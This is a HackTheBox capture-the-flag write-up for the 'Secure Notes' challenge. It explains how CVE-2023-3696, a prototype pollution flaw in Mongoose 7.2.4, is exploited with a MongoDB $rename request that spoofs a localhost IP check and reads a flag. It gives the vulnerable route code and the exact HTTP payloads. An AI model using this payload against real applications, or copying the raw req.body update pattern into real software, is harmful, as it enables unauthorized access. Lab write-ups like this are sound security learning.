# Secure Notes — HTB Writeup
[Here are the notes I took while solving](./Walkthrough)

## First Look

Landing on the page, the goal is clear: get the `FLAG` environment variable, or more precisely, hit this endpoint successfully:

```javascript
app.get('/flag', (req, res) => {
    const remoteAddress = req.connection.remoteAddress;
    if (remoteAddress === '127.0.0.1' || remoteAddress === '::1' || remoteAddress === '::ffff:127.0.0.1') {
        res.send(process.env.FLAG ?? 'HTB{f4k3_fl4g_f0r_t3st1ng}');
    } else {
        res.status(403).json({ Message: 'Access denied' });
    }
})
```

The gate is simple: you need the request to come from `localhost`. Since we're clearly not the server, the classic SSRF reflex kicks in. I started looking for any way to trigger a server-side request, redirect, or proxy — but after going through the source code carefully, I found **nothing**. No open redirect, no fetch call, no obvious logic flaw.

That's when I switched strategy: if there's no logic bug, it's probably a **CVE**.

---

## Hunting for the Vulnerability

We have access to `package-lock.json`, which is always a goldmine in these situations. One entry caught my eye immediately:

```json
"node_modules/mongoose": {
    "version": "7.2.4"
}
```

That's a pretty old version of Mongoose. A quick search later and I land on a **CVSS 10.0** vulnerability:

> **[CVE-2023-3696](https://security.snyk.io/vuln/SNYK-JS-MONGOOSE-5777721) — Prototype Pollution in Mongoose ≤ 7.2.4**
>
> Affected versions of this package are vulnerable to Prototype Pollution in `document.js`, via update functions such as `findByIdAndUpdate()`.

And right there in the source code, the vulnerable pattern:

```javascript
app.post('/update', async (req, res) => {
    try {
        const { noteId } = req.body;
        await Note.findByIdAndUpdate(noteId, req.body);
        let result = await Note.find({ _id: noteId });
        res.json(result);
    } catch (error) {
        console.error(error);
        res.status(500).json({ Message: "An error occurred" });
    }
});
```

`findByIdAndUpdate()` with a raw `req.body` passed directly — textbook vulnerable code. Now I just needed to figure out **what** to pollute and **how**.

---

## Understanding What to Pollute

I spun up the app locally and started stuffing the `/flag` route with logs to understand what's happening under the hood:

```javascript
app.get('/flag', (req, res) => {
    console.log("flag 1:", JSON.stringify(Object.prototype))
    console.log("flag 2:", Object.prototype)
    console.log("flag 3:", Object)
    const remoteAddress = req.connection.remoteAddress;
    console.log("flag 4:", remoteAddress)
    console.log("flag 5:", req)
    console.log("flag 6:", req.__proto__)
    console.log("flag 7:", remoteAddress.__proto__)
    // ...
});
```

Dumping the full `req` object (`flag 5`) revealed something interesting — the actual IP address isn't directly stored as a string, it's nested inside:

```
_peername: { address: '::ffff:172.17.0.1', family: 'IPv6', port: 43298 }
```

That's the real source of truth for `remoteAddress`. After some digging, I understood the mechanism: `_peername` is populated **lazily** — it's `undefined` at first and only gets set the first time `remoteAddress` is accessed (likely via a getter). Crucially, **if it's already set, it won't be overwritten**.

That's the key insight. If I can pollute `Object.prototype._peername.address` to `'127.0.0.1'` *before* the getter fires, the check will pass. No SSRF needed. No bypass. Just straight-up lying to Node about where the request came from.

---

## Exploitation

**Step 1 — Create a note and set the content to the target IP**

First I need to get `127.0.0.1` into the database somewhere. I create a note, then update it:

```http
POST /update HTTP/1.1
Host: localhost:1337
Content-Type: application/json

{"noteId":"6995ce4284849a901fa222ce","title":"test","content":"127.0.0.1"}
```

**Step 2 — Use `$rename` to move that value into the prototype**

This is where the magic happens. MongoDB's `$rename` operator moves a field value from one key to another. Combined with Mongoose's prototype pollution vulnerability, we can rename `content` to `__proto__._peername.address` — which walks up the prototype chain and pollutes `Object.prototype` directly:

```http
POST /update HTTP/1.1
Host: localhost:1337
Content-Type: application/json

{"$rename":{"content":"__proto__._peername.address"},"noteId":"6995ce4284849a901fa222ce"}
```

Checking the logs confirms the pollution worked:

```
flag 2: [Object: null prototype] {
    _peername: { address: '127.0.0.1' }
}
```

**Step 3 — Grab the flag**

```http
GET /flag HTTP/1.1
Host: localhost:1337
```

And we're in. 🎉

---

## Conclusion

I genuinely loved this challenge. I had never really dug into prototype pollution before — I knew the concept existed but had never actually exploited it. Having to combine a specific CVE with a solid understanding of Node.js internals (the lazy `_peername` getter) made it feel really satisfying to crack.

The path wasn't obvious at all: no SSRF, no logic flaw, just a version number in a lockfile leading to a perfect storm of a vulnerability. That's the kind of rabbit hole I could spend hours in.

---

*Writeup by Neirda — HackTheBox | Secure Notes*
